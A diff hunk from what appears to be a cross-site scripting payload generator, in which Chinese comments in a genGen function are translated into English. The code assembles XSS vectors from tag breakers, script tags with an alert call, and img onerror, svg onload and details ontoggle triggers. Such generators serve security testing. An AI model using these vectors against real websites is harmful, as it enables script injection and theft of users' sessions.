@@ -154,33 +154,33 @@ def genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends,
                                     if badTag:
                                         breaker = '</' + r(badTag) + '>'
                                     
-                                    # script标签特殊处理：直接包含JavaScript代码（仅在精简模式中）
+                                    # Special handling for script tag: direct inclusion of JavaScript code (only in slim mode)
                                     if tag == 'script' and eventHandler == 'direct':
                                         # <script>alert(1)</script>
                                         vector = breaker + '<' + r(tag) + '>' + function + '</' + r(tag) + '>' + bait
                                         vectors.append(vector)
                                         continue
                                     
-                                    # 为不同标签添加必要的触发属性（精简模式）
+                                    # Add necessary trigger attributes for different tags (slim mode)
                                     trigger_attr = ''
                                     if tag == 'img':
-                                        trigger_attr = filling + 'src=x'  # img需要src属性触发onerror
+                                        trigger_attr = filling + 'src=x'  # img needs src attribute to trigger onerror
                                     elif tag == 'svg':
-                                        trigger_attr = ''  # svg的onload可以直接触发
+                                        trigger_attr = ''  # svg's onload can be triggered directly
                                     elif tag == 'details':
-                                        trigger_attr = filling + 'open'  # details需要open属性触发ontoggle
+                                        trigger_attr = filling + 'open'  # details needs open attribute to trigger ontoggle
                                     elif tag == 'body':
-                                        trigger_attr = ''  # body标签的事件可以直接触发
+                                        trigger_attr = ''  # body tag events can be triggered directly
                                     
-                                    # 修复：= 号后面不应该有额外的空格
-                                    # 兼容完整模式：使用原始格式（eFilling会在=两边）
-                                    # 兼容精简模式：使用改进的格式（trigger_attr + eventHandler）
+                                    # Fix: there should be no extra spaces after the = sign
+                                    # Compatible with full mode: use original format (eFilling will be on both sides of =)
+                                    # Compatible with slim mode: use improved format (trigger_attr + eventHandler)
                                     if trigger_attr or tag in ('body', 'svg'):
-                                        # 精简模式格式：<tag trigger_attr filling eventHandler eFilling = function lFilling end bait
+                                        # Slim mode format: <tag trigger_attr filling eventHandler eFilling = function lFilling end bait
                                         vector = breaker + '<' + r(tag) + trigger_attr + filling + r(
                                             eventHandler) + eFilling + '=' + function + lFilling + end + bait
                                     else:
-                                        # 完整模式格式（向后兼容）：<tag filling eventHandler eFilling = eFilling function lFilling end bait
+                                        # Full mode format (backward compatibility): <tag filling eventHandler eFilling = eFilling function lFilling end bait
                                         vector = breaker + '<' + r(tag) + filling + r(
                                             eventHandler) + eFilling + '=' + eFilling + function + lFilling + end + bait
                                     
